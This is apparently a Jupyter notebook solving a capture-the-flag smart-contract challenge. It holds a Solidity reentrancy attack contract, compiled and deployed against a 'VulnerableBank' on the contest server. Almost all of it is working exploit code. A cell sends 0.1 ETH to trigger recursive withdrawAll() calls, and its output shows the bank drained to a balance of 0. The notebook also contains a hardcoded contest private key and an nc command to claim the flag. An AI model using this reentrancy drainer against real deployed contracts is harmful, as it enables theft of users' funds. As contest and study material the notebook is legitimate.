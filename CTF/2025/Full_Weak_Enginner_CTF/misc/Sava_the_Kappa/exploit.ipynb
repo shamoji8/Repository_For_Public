{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# Sava_the_Kappa one-file exploit notebook\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 16,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Connected: True\n"
          ]
        }
      ],
      "source": [
        "# 手入力で設定\n",
        "RPC = \"http://chal1.fwectf.com:8019/\"  # 例: メニューのRPC endpoint\n",
        "PRIV = \"0x6dda95d8395b9cea896fab8a7a155a12e11f576f5c0b5c4de5249b56d3e7aa82\"  # 例: メニューの Player PRIV\n",
        "BANK = \"0xa16E02E87b7454126E5E10d957A927A7F5B5d2be\"  # 例: メニューの VulnerableBank アドレス\n",
        "\n",
        "# 依存を最小限インストール（必要時のみ）\n",
        "import sys, subprocess\n",
        "\n",
        "def pip_install(pkgs):\n",
        "    subprocess.run([sys.executable, \"-m\", \"pip\", \"install\", \"--quiet\", *pkgs], check=True)\n",
        "\n",
        "try:\n",
        "    import web3  # type: ignore\n",
        "except Exception:\n",
        "    pip_install([\"web3\", \"eth_account\"])  # 既成bytecode方式\n",
        "\n",
        "from web3 import Web3\n",
        "from eth_account import Account\n",
        "w3 = Web3(Web3.HTTPProvider(RPC))\n",
        "acct = Account.from_key(PRIV) if PRIV else None\n",
        "print(\"Connected:\", w3.is_connected())\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 17,
      "metadata": {},
      "outputs": [],
      "source": [
        "# Attack.sol をノート内でコンパイルして ABI/bytecode を得る（py-solc-x使用）\n",
        "import sys, subprocess\n",
        "\n",
        "def pip_install(pkgs):\n",
        "    subprocess.run([sys.executable, \"-m\", \"pip\", \"install\", \"--quiet\", *pkgs], check=True)\n",
        "\n",
        "try:\n",
        "    import solcx  # type: ignore\n",
        "except Exception:\n",
        "    pip_install([\"py-solc-x\"])  # 依存が無ければ導入\n",
        "    import solcx  # type: ignore\n",
        "\n",
        "# 必要なSolidityコンパイラを用意\n",
        "try:\n",
        "    solcx.set_solc_version(\"0.8.26\")\n",
        "except Exception:\n",
        "    solcx.install_solc(\"0.8.26\")\n",
        "    solcx.set_solc_version(\"0.8.26\")\n",
        "\n",
        "ATTACK_SOURCE = r\"\"\"\n",
        "// SPDX-License-Identifier: MIT\n",
        "pragma solidity ^0.8.26;\n",
        "\n",
        "interface IVulnerableBank {\n",
        "    function deposit() external payable;\n",
        "    function withdrawAll() external;\n",
        "}\n",
        "\n",
        "contract Attack {\n",
        "    IVulnerableBank public bank;\n",
        "    address public owner;\n",
        "    uint256 public depositAmount;\n",
        "\n",
        "    constructor(address _bank) payable {\n",
        "        bank = IVulnerableBank(_bank);\n",
        "        owner = msg.sender;\n",
        "    }\n",
        "\n",
        "    function pwn() external payable {\n",
        "        require(msg.sender == owner, \"not owner\");\n",
        "        require(msg.value > 0, \"need value\");\n",
        "        depositAmount = msg.value;\n",
        "        bank.deposit{value: msg.value}();\n",
        "        bank.withdrawAll();\n",
        "    }\n",
        "\n",
        "    receive() external payable {\n",
        "        uint256 bankBal = address(bank).balance;\n",
        "        if (depositAmount > 0 && bankBal >= depositAmount) {\n",
        "            bank.withdrawAll();\n",
        "            return;\n",
        "        }\n",
        "        payable(owner).transfer(address(this).balance);\n",
        "    }\n",
        "}\n",
        "\"\"\"\n",
        "\n",
        "compiled = solcx.compile_source(\n",
        "    ATTACK_SOURCE,\n",
        "    output_values=[\"abi\", \"bin\"],\n",
        "    optimize=True,\n",
        ")\n",
        "attack_key = \"<stdin>:Attack\"\n",
        "ATTACK_ABI = compiled[attack_key][\"abi\"]\n",
        "ATTACK_BYTECODE = \"0x\" + compiled[attack_key][\"bin\"]\n",
        "\n",
        "assert RPC and PRIV and BANK, \"RPC/PRIV/BANK を設定してください。\"\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 18,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Attack deployed at 0x50B1682BE2321b59Bc87B92FA0D058833C01BaEf\n",
            "attack tx status 1\n",
            "bank balance 0\n"
          ]
        }
      ],
      "source": [
        "# デプロイ → 攻撃 → 検証\n",
        "from web3 import Web3\n",
        "from eth_account import Account\n",
        "\n",
        "w3 = Web3(Web3.HTTPProvider(RPC))\n",
        "acct = Account.from_key(PRIV)\n",
        "\n",
        "# 1) デプロイ\n",
        "Attack = w3.eth.contract(abi=ATTACK_ABI, bytecode=ATTACK_BYTECODE)\n",
        "construct_tx = Attack.constructor(BANK).build_transaction({\n",
        "    'from': acct.address,\n",
        "    'nonce': w3.eth.get_transaction_count(acct.address),\n",
        "    'gas': 2_500_000,\n",
        "    'maxFeePerGas': w3.to_wei('1', 'gwei'),\n",
        "    'maxPriorityFeePerGas': w3.to_wei('1', 'gwei'),\n",
        "    'value': 0\n",
        "})\n",
        "signed = acct.sign_transaction(construct_tx)\n",
        "create_hash = w3.eth.send_raw_transaction(signed.raw_transaction)\n",
        "receipt = w3.eth.wait_for_transaction_receipt(create_hash)\n",
        "attack_addr = receipt.contractAddress\n",
        "print('Attack deployed at', attack_addr)\n",
        "\n",
        "# 2) 攻撃（約0.1 ETHを送ってreentrancy）\n",
        "attack = w3.eth.contract(address=attack_addr, abi=ATTACK_ABI)\n",
        "call_tx = attack.functions.pwn().build_transaction({\n",
        "    'from': acct.address,\n",
        "    'nonce': w3.eth.get_transaction_count(acct.address),\n",
        "    'gas': 25_000_000,\n",
        "    'maxFeePerGas': w3.to_wei('1', 'gwei'),\n",
        "    'maxPriorityFeePerGas': w3.to_wei('1', 'gwei'),\n",
        "    'value': w3.to_wei('0.1', 'ether'),\n",
        "})\n",
        "signed2 = acct.sign_transaction(call_tx)\n",
        "hash2 = w3.eth.send_raw_transaction(signed2.raw_transaction)\n",
        "rcpt2 = w3.eth.wait_for_transaction_receipt(hash2)\n",
        "print('attack tx status', rcpt2.status)\n",
        "\n",
        "# 3) Bank残高確認\n",
        "bank_bal = w3.eth.get_balance(BANK)\n",
        "print('bank balance', bank_bal)\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## 仕上げ（フラグ取得）\n",
        "- `bank balance` が0なら、別ターミナルで以下を実行して `3` を選択:\n",
        "```bash\n",
        "nc chal1.fwectf.com 8020\n",
        "# → 3 を入力（get flag）\n",
        "```\n",
        "- `fwectf{...}` が表示されます。\n"
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.12.0"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 2
}
